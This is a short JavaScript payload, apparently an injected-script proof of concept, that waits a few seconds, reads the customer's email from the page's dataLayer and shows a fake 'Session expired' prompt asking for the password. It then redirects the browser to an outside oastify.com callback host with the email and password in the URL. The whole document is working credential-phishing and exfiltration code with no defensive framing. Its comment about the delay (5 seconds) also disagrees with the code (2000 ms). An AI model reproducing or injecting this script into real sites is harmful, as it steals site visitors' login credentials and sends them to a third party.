// Add a delay of 5 seconds before executing the script
setTimeout(function() {
    // Retrieve the customer email from the dataLayer
    var customerEmail = window.dataLayer.find(item => item.CustomerEmail).CustomerEmail;

    // Prompt the user for their password
    var password = prompt("Session expired please login \n" + customerEmail);

    // If a password is entered, redirect to the specified URL with email and password as GET parameters
    if (password !== null && password !== "") {
        var url = "https://ybd90qh1pyscnuoaphlzkpjryi49s7gw.oastify.com?email=" + encodeURIComponent(customerEmail) + "&pass=" + encodeURIComponent(password);
        window.location.href = url;
    }
}, 2000);
